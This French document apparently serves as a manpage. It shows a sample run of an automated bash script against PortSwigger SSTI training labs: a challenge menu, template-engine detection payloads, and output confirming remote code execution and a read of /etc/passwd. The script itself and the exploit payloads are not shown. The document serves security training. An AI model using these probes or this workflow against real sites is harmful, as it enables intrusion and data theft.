# MANPAGE

Voici un **exemple exhaustif d’exécution** du script automatisé présenté ci-dessus, appliqué à un lab PortSwigger SSTI (par exemple, le lab [Basic server-side template injection][3][5]) :

---

## 1. Lancement du script

```bash
$ bash ssti_automated.sh
```

---

## 2. Menu affiché

```
PortSwigger SSTI Challenges - Analyse, Attaque, Contrôle (détection moteur auto)
--------------------------------------------------------------------------
URL du lab : https://YOUR-LAB-ID.web-security-academy.net
Paramètre vulnérable : message

1. [1] Exploiting basic server-side template injection
2. [2] Exploiting SSTI to execute arbitrary code
3. [3] Bypassing input filters to exploit SSTI
4. [4] Exploiting SSTI in a sandboxed environment (Twig)
5. [5] Exploiting SSTI for remote code execution
6. [6] Exfiltrating data via SSTI
q. Quit

Choisissez un challenge (1-6, q pour quitter) :
```

---

## 3. Exemple : Challenge 1 — Basic server-side template injection

Supposons que l’utilisateur choisit **1**.

### Analyse

```
[1] Analyse : Exploiting basic server-side template injection
[Analyse] Détection du moteur de template employé...
  > Injection du payload polyglotte : ${{<%[%'"}}%\
    => Réponse anormale détectée (possible SSTI).
  > Test jinja2 : {{7*7}}
  > Test twig : {{7*7}}
  > Test velocity : #set($a=7*7) $a
  > Test erb : <%= 7*7 %>
    => Moteur détecté : ERB (Ruby)
  > Test freemarker : ${7*7}
```

### Attaque

```
[1] Attaque : Injection mathématique (erb)
<-- Affichage du résultat de la commande curl -->
49
```

### Contrôle

```
[1] Contrôle : Résultat attendu '49'
    => SSTI confirmée.
```

---

## 4. Exemple : Challenge 2 — Exploiting SSTI to execute arbitrary code

Supposons que l’utilisateur choisit **2**.

### Analyse

```
[2] Analyse : Exploiting SSTI to execute arbitrary code
[Analyse] Détection du moteur de template employé...
  > Injection du payload polyglotte : ${{<%[%'"}}%\
    => Réponse anormale détectée (possible SSTI).
  > Test jinja2 : {{7*7}}
  > Test twig : {{7*7}}
  > Test velocity : #set($a=7*7) $a
  > Test erb : <%= 7*7 %>
    => Moteur détecté : ERB (Ruby)
  > Test freemarker : ${7*7}
```

### Attaque

```
[2] Attaque : Exécution de code (erb)
<-- Affichage du résultat de la commande curl -->
uid=1000(carlos) gid=1000(carlos) groups=1000(carlos)
```

### Contrôle

```
[2] Contrôle : Résultat attendu 'uid='
    => RCE confirmée.
```

---

## 5. Exemple : Challenge 6 — Exfiltrating data via SSTI

Supposons que l’utilisateur choisit **6**.

### Analyse

```
[6] Analyse : Exfiltrating data via SSTI
[Analyse] Détection du moteur de template employé...
  > Injection du payload polyglotte : ${{<%[%'"}}%\
    => Réponse anormale détectée (possible SSTI).
  > Test jinja2 : {{7*7}}
  > Test twig : {{7*7}}
  > Test velocity : #set($a=7*7) $a
  > Test erb : <%= 7*7 %>
    => Moteur détecté : ERB (Ruby)
  > Test freemarker : ${7*7}
```

### Attaque

```
[6] Attaque : Lecture de fichier (erb)
<-- Affichage du résultat de la commande curl -->
root:x:0:0:root:/root:/bin/bash
...
```

### Contrôle

```
[6] Contrôle : Résultat attendu 'root:x'
    => Exfiltration confirmée.
```

---

## 6. Changement de challenge ou sortie

L’utilisateur peut alors choisir un autre numéro ou `q` pour quitter.

---
